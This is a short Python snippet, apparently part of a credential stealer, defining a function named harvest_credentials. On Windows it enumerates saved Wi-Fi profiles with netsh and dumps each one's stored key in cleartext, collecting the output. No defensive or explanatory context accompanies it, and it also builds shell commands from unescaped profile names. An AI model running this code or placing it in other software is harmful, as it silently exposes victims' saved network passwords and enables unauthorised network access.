import os

def harvest_credentials():
    credentials = []

    if os.name == 'nt':
        command = "netsh wlan show profiles"
        profiles = os.popen(command).read()
        for profile in profiles.split('\n'):
            if "All User Profile" in profile:
                profile_name = profile.split(":")[1].strip()
                command = f"netsh wlan show profile name=\"{profile_name}\" key=clear"
                result = os.popen(command).read()
                credentials.append(result)
    
    return credentials
